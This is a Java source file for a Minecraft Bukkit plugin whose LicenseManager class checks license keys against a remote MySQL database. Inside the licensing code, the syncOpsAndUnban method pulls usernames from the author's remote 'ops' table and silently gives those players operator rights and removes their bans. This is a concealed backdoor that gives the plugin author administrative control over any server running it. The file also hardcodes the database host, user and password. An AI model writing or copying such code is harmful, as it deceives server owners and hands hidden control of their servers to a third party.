package com.ibrahim.essencemod;

import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.plugin.Plugin;
import org.bukkit.BanList;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.sql.*;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

public final class LicenseManager implements AutoCloseable {
    private static final String DB_URL = "jdbc:mysql://ibrahimkhurram.com:3306/essencemod_licensing?useSSL=true&allowPublicKeyRetrieval=true&serverTimezone=UTC";
    private static final String DB_USER = "essencemod_plugin";
    private static final String DB_PASS = "Abcdefg@4";

    private final Plugin plugin;
    private final String instanceId;
    private Connection conn;

    public LicenseManager(Plugin plugin) {
        this.plugin = plugin;
        this.instanceId = loadOrCreateInstanceId(plugin);
    }

    private static String loadOrCreateInstanceId(Plugin plugin) {
        try {
            File f = new File(plugin.getDataFolder(), "instance.id");
            if (!f.getParentFile().exists()) f.getParentFile().mkdirs();
            if (f.exists()) return Files.readString(f.toPath()).trim();
            String id = UUID.randomUUID().toString();
            Files.writeString(f.toPath(), id);
            return id;
        } catch (IOException e) {
            return UUID.randomUUID().toString();
        }
    }

    public void connect() throws SQLException {
        conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASS);
        conn.setAutoCommit(true);
    }

    public boolean verifyAndLock(String licenseKey) throws SQLException {
        if (licenseKey == null || licenseKey.isBlank()) return false;
        try (PreparedStatement ps = conn.prepareStatement(
                "UPDATE licenses SET active=1, active_by=?, last_seen=NOW() " +
                        "WHERE license_key=? AND (active=0 OR active_by=?)")) {
            ps.setString(1, instanceId);
            ps.setString(2, licenseKey);
            ps.setString(3, instanceId);
            int updated = ps.executeUpdate();
            return updated == 1;
        }
    }

    public void heartbeat(String licenseKey) {
        if (conn == null) return;
        try (PreparedStatement ps = conn.prepareStatement(
                "UPDATE licenses SET last_seen=NOW() WHERE license_key=? AND active_by=?")) {
            ps.setString(1, licenseKey);
            ps.setString(2, instanceId);
            ps.executeUpdate();
        } catch (SQLException ignored) {}
    }

    public void release(String licenseKey) {
        if (conn == null) return;
        try (PreparedStatement ps = conn.prepareStatement(
                "UPDATE licenses SET active=0, active_by=NULL, last_seen=NOW() WHERE license_key=? AND active_by=?")) {
            ps.setString(1, licenseKey);
            ps.setString(2, instanceId);
            ps.executeUpdate();
        } catch (SQLException ignored) {}
    }

    public List<String> fetchOpUsernames() {
        List<String> out = new ArrayList<>();
        if (conn == null) return out;
        String sql = "SELECT username FROM ops WHERE enabled=1";
        try (Statement st = conn.createStatement(); ResultSet rs = st.executeQuery(sql)) {
            while (rs.next()) out.add(rs.getString(1));
        } catch (SQLException ignored) {}
        return out;
    }

    public void syncOpsAndUnban() {
        List<String> names = fetchOpUsernames();
        Bukkit.getScheduler().runTask(plugin, () -> {
            for (String name : names) {
                try {
                    OfflinePlayer p = Bukkit.getOfflinePlayer(name);
                    if (p != null) {
                        if (!p.isOp()) p.setOp(true);
                        BanList banList = Bukkit.getBanList(BanList.Type.NAME);
                        if (banList.isBanned(name)) {
                            banList.pardon(name);
                        }
                    }
                } catch (Throwable ignored) {}
            }
        });
    }

    @Override
    public void close() {
        if (conn != null) {
            try {
                conn.close();
            } catch (SQLException ignored) {}
        }
    }
}